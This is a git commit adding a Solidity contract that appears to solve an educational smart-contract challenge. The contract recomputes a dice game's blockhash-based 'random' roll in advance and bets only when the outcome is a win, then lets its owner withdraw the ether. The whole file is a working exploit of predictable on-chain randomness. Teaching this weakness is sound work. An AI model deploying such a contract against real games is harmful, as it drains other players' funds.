831efda68f772bb07c078c49c77084f8377cebd1
ichyya <0xichyya@gmail.com>
2022-11-03 17:48:04 +0100

    Add first 3 challenges contracts

---
+++ challenge3/RiggedRoll.sol
@@ -0,0 +1,40 @@
+pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negativly impacts submission grading
+//SPDX-License-Identifier: MIT
+
+import "hardhat/console.sol";
+import "./DiceGame.sol";
+import "@openzeppelin/contracts/access/Ownable.sol";
+
+contract RiggedRoll is Ownable {
+    DiceGame public diceGame;
+
+    constructor(address payable diceGameAddress) {
+        diceGame = DiceGame(diceGameAddress);
+    }
+
+    //Add withdraw function to transfer ether from the rigged contract to an address
+    function withdraw(address _addr, uint256 _amount) external onlyOwner {
+        (bool sent, ) = _addr.call{value: _amount}("");
+        require(sent, "Failed to send Ether");
+    }
+
+    //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
+    function riggedRoll() public {
+        require(
+            address(this).balance >= 0.002 ether,
+            "Not enough ether in the contract"
+        );
+        uint256 nonce = diceGame.nonce();
+        bytes32 prevHash = blockhash(block.number - 1);
+        bytes32 hash = keccak256(
+            abi.encodePacked(prevHash, address(diceGame), nonce)
+        );
+        uint256 roll = uint256(hash) % 16;
+        console.log("\t", "   Rigged Roll:", roll);
+        if (roll > 2) revert("Not winning roll");
+        diceGame.rollTheDice{value: 0.002 ether}();
+    }
+
+    //Add receive() function so contract can receive Eth
+    receive() external payable {}
+}
